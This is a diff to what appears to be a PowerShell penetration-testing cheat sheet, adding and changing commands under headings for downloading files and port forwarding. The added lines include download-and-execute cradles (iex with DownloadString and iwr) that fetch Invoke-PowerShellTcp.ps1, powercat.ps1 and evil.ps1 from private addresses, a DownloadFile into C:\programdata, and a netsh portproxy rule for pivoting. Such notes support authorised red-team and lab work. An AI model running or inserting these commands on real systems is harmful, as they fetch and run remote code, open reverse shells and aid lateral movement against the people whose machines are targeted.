@@ -45,7 +45,7 @@ Get-Help <module_name>
 ### Download files
 
 ```powershell
-iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
+iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1'));
 ```
 
 more options
@@ -68,11 +68,18 @@ $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil
 PowerShell v3+
 
 ```powershell
+iex (iwr http://172.16.100.83/powercat.ps1 -UseBasicParsing)
 iex (iwr 'http://192.168.230.1/evil.ps1')
 ```
 
 Download and store
 
 ```powershell
-iex (new-Object Net.WebClient).DownloadFile('http://<IP>/<File>', 'C:\programdata\<File>')
+(new-Object Net.WebClient).DownloadFile('http://<IP>/<File>', 'C:\programdata\<File>')
+```
+
+### Port Forward
+
+```batch
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
 ```
